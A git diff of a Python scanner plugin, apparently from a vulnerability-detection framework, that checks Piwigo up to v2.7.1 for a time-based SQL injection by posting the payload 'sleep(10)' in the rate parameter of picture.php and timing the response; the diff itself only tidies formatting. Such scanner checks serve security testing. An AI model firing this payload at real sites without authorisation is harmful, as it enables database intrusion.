@@ -7,11 +7,12 @@ import urllib
 import urllib2
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Piwigo_0001' # 平台漏洞编号，留空
+    vuln_id = 'Piwigo_0001'  # 平台漏洞编号，留空
     name = 'Piwigo <= v2.7.1 /functions_rate.inc.php SQL注入漏洞'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-12-28'  # 漏洞公布时间
     desc = '''
         由于functions_rate.inc.php文件中的rate_picture函数没有对传入的$rate变量进行过滤，直接拼接到SQL中执行。
@@ -21,6 +22,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Piwigo'  # 漏洞应用名称
     product_version = '<= v2.7.1'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'e1d716f1-e6b3-4063-9b30-0e2437b2db0b'
@@ -34,19 +36,19 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-                
+
             verify_url = '%s/picture.php?/3/category/1/&action=rate' % self.target
-            data = {'rate':'sleep(10)'}
+            data = {'rate': 'sleep(10)'}
             req = urllib2.Request(verify_url)
             data = urllib.urlencode(data)
             opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
-            a = time.time();
+            a = time.time()
             response = opener.open(req, data)
-            b = time.time();
+            b = time.time()
             req = urllib2.Request(verify_url)
             c = b-a
 
-            if c>=10 and c<=15:
+            if c >= 10 and c <= 15:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -55,6 +57,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
